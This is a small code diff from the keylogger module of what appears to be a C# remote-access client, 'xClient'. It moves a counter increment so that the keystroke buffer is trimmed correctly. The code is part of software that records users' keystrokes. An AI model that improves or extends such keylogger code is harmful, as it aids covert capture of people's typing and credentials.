@@ -236,8 +236,8 @@ namespace xClient.Core.Keylogger
                             }
                             break;
                     }
-                    j++;
                 }
+                j++;
             }
             if (j > 0 && j <= _keyBuffer.Count)
                 _keyBuffer.RemoveRange(0, j);
